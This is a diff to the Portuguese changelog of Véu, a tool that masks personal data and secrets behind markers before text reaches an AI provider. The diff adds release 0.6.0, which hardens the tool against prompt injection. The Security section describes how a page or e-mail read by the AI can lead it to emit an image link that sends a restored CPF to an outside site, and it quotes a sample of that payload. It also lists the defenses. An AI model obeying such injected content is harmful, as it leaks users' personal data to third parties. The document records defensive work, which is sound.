@@ -5,7 +5,27 @@ O formato segue o [Keep a Changelog](https://keepachangelog.com/pt-BR/1.1.0/) e 
 
 ## [Unreleased]
 
+## [0.6.0] - 2026-11-07
+
+Restauração segura contra injeção de prompt. Como o provedor de IA só vê marcadores, o dado real só reaparece na restauração; agora ela segue regras fixas, que não dependem de o modelo obedecer.
+
+### Segurança
+- **Os dados reais não voltam dentro de links, imagens e URLs.** Uma página ou um e-mail lido pela IA pode induzi-la a escrever `![x](https://site/?d=[CPF_1])`; antes, a restauração trocava o marcador e o navegador enviava o CPF real ao site. Vale para markdown (inclusive links por referência e com `<...>`), autolinks, URLs soltas, `mailto:`, atributos HTML (`src`, `href`, `srcset`, `url(...)`), argumentos de ferramentas em JSON (inclusive `\/` e `\u002f`) e streaming com o link cortado entre pedaços. Domínios confiáveis podem ser liberados em `[restauracao] dominios_links`.
+- **Chaves de API, tokens e senhas não são restaurados nos argumentos de ferramentas** de agentes (`segredos_em_ferramentas = true` volta ao comportamento antigo). `ferramentas = false` desliga a restauração de todos os argumentos.
+- **Marcadores forjados são desarmados:** um `[CPF_1]` que já chega no texto (escrito numa página, num e-mail ou num documento) vira `[CPF#1]` antes do envio e nunca é restaurado.
+- **MCP:** `restaurar_texto`, que devolve os dados reais para a conversa, vem desligada (`veu mcp --com-restauracao` liga). A nova `restaurar_para_arquivo` grava a resposta com os dados reais num arquivo local e devolve só o caminho.
+- **Operador `hash`:** HMAC-SHA256 com chave derivada só para esse uso e 64 bits na saída (`[CPF_3fa2c1d9e07b4a12]`); uma colisão gera erro em vez de trocar uma pessoa por outra. `VEU_SEGREDO` e `VEU_SEGREDO_AUDITORIA` precisam ter pelo menos 32 caracteres.
+- Um teste garante a falha fechada: se a detecção quebrar, a requisição não é enviada ao provedor.
+
+### Adicionado
+- Seção `[restauracao]` no `veu.toml` (`links`, `dominios_links`, `ferramentas`, `segredos_em_ferramentas`) e opção `restore` na biblioteca JavaScript.
+- `veu restaurar --restaurar-links`.
+- [Modelo de ameaças](docs/modelo-de-ameacas.md): fronteiras de confiança, ameaças, defesas e o que o Véu não protege.
+- Casos de restauração compartilhados entre Python e JavaScript (`js/test/restauracao.json`), testados inteiros e cortados em qualquer ponto.
+
 ### Alterado
+- **Incompatível:** os marcadores do operador `hash` mudaram (16 caracteres hexadecimais, chave derivada). Pseudônimos gerados com versões anteriores não batem com os novos.
+- **Incompatível:** um `VEU_SEGREDO` com menos de 32 caracteres impede o Véu de iniciar, com uma mensagem que ensina a gerar um novo.
 - README, banner, descrições do PyPI e do npm, GitHub Action, hook de pre-commit e servidor MCP passam a apresentar o Véu como proteção de dados pessoais e segredos em geral, com suporte completo a documentos brasileiros (e não só para dados brasileiros).
 
 ## [0.5.2] - 2026-11-07
@@ -191,7 +211,8 @@ Primeira versão.
 ### Benchmark
 - Gerador de textos anotados com dados falsos, conjuntos de desenvolvimento, validação e casos difíceis, e o comando `veu avaliar`.
 
-[Unreleased]: https://github.com/guhttps/veu/compare/v0.5.2...HEAD
+[Unreleased]: https://github.com/guhttps/veu/compare/v0.6.0...HEAD
+[0.6.0]: https://github.com/guhttps/veu/compare/v0.5.2...v0.6.0
 [0.5.2]: https://github.com/guhttps/veu/compare/v0.5.1...v0.5.2
 [0.5.1]: https://github.com/guhttps/veu/compare/v0.5.0...v0.5.1
 [0.5.0]: https://github.com/guhttps/veu/compare/v0.4.0...v0.5.0
